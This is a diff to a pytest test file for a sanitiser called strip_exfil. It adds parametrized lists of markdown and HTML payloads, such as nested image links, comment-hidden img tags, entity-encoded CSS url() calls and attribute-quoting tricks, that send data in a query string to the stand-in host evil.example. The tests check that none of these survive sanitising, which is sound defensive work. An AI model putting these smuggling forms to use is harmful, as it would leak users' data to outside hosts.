@@ -1,5 +1,7 @@
 from __future__ import annotations
 
+import re
+
 import pytest
 
 from app.domain.access_mode import AccessMode
@@ -76,7 +78,14 @@ def test_nested_brackets_data_href_link_tag_and_css_url_lose_unseen_addresses():
     assert "<https://jobs.example/p/1>" in out
 
 
-EVIL_FORMS = [
+MARKDOWN_FORMS = [
+    "![a [b [c] d] e](https://evil.example/x?d=S)",
+    "[a [b] c](https://evil.example/x?d=S)",
+    "[![x](https://evil.example/i.png)](https://evil.example/x?d=S)",
+    "!<img>[a]<img>(https://evil.example/x?d=S)",
+]
+
+HTML_FORMS = [
     "![a [b [c] d] e](https://evil.example/x?d=S)",
     "[a [b] c](https://evil.example/x?d=S)",
     "[![x](https://evil.example/i.png)](https://evil.example/x?d=S)",
@@ -117,11 +126,32 @@ def test_a_reference_image_never_survives_wherever_its_definition_sits(form):
     assert "![" not in out
 
 
-@pytest.mark.parametrize("form", EVIL_FORMS)
-def test_deeper_nesting_and_attribute_tricks_lose_unseen_addresses(form):
+@pytest.mark.parametrize("form", MARKDOWN_FORMS)
+def test_markdown_and_joined_forms_lose_unseen_addresses(form):
     out = strip_exfil(f"앞 {form} 뒤", "https://jobs.example/p/1")
 
     assert "evil.example" not in out
+    assert out.startswith("앞 ") and out.endswith(" 뒤")
+
+
+HIDDEN_TAGS = [
+    '<!-- <p title="--><img src=https://evil.example/x?d=S>"> -->',
+    '<가 x="<img src=https://evil.example/x?d=S>">',
+    '`<p title="` <img src=https://evil.example/x?d=S> `">`',
+    '\\<p title="x <img src=https://evil.example/x?d=S> ">',
+    '<a href="https://jobs.example/p/1" style="background:url&#40;https://evil.example/x?d=S&#41;">t</a>',
+    '<a style="background:url&#40;https://evil.example/x?d=S&#41;">t</a>',
+    '<a title=">" href="https://evil.example/x?d=S">t</a>',
+    '<a data-x="1"href=https://evil.example/x?d=S>t</a>',
+]
+
+
+@pytest.mark.parametrize("form", HTML_FORMS + HIDDEN_TAGS)
+def test_no_html_tag_survives_however_it_hides(form):
+    out = strip_exfil(f"앞 {form} 뒤", "https://jobs.example/p/1")
+
+    assert not re.search(r"<[A-Za-z/!?]", out)
+    assert "![" not in out
     assert out.startswith("앞 ") and out.endswith(" 뒤")
 
 
